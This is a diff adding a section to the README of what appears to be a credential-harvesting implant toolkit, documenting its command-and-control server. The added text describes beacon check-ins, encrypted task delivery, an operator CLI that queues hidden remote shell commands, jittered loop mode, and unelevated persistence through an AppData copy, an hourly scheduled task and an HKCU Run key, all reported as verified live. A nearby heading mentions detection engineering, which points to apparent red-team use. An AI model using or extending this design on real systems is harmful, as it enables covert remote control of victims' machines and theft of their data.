@@ -386,6 +386,35 @@ Chain, all offline from exfiltrated material:
 Requirements (venv): `cryptography`, `impacket` —
 `uv pip install cryptography impacket`.
 
+
+## C2 tasking, loop mode & persistence
+
+The collector is a full C2, not just a dead-drop:
+
+- **`GET /beacon?id=HOST-user`** — implant check-in. Registers the host in
+  `hosts.json` (last seen, beacons, elevated, persistence state) and pops one
+  queued task, delivered as an **SHV1-encrypted** container (same PSK/AEAD as
+  exfil — tasking is opaque to network observers).
+- **`server/c2ctl.py`** — operator CLI:
+  - `hosts` — roster with online status
+  - `queue <host> --stages brow,key --exec "cmd" --persist`
+  - `tasks` / `unqueue`
+- **Implant loop mode** — `--loop 300 --jitter 60` beacons every ~5 min,
+  decrypts tasks, applies them (`stages` re-scopes the next harvest,
+  `exec` runs a hidden shell command whose output returns as a
+  `task:exec.txt` loot part, `persist` installs persistence).
+  `--cycles N` bounds the loop for testing.
+- **Persistence (`--persist`, unelevated)** — stages the binary to
+  `%APPDATA%\Microsoft\<pname>.exe`, registers an hourly scheduled task
+  (logon trigger where the box allows it) plus an HKCU Run key. The staged
+  copy self-detects its launch location and enters loop mode with no CLI
+  args (schtasks rejects dash-args, so the trigger stays bare).
+- **TLS** — `--tls-cert/--tls-key` on the collector; pair with the implant
+  build flag `/pin cert:HEX`.
+
+Verified live: queue -> beacon delivery -> remote exec output returned as
+loot; persistence install/query/delete round-trip.
+
 ## Detection engineering
 
 `docs/TECHNIQUES.md` documents the full defender view — Event 4672
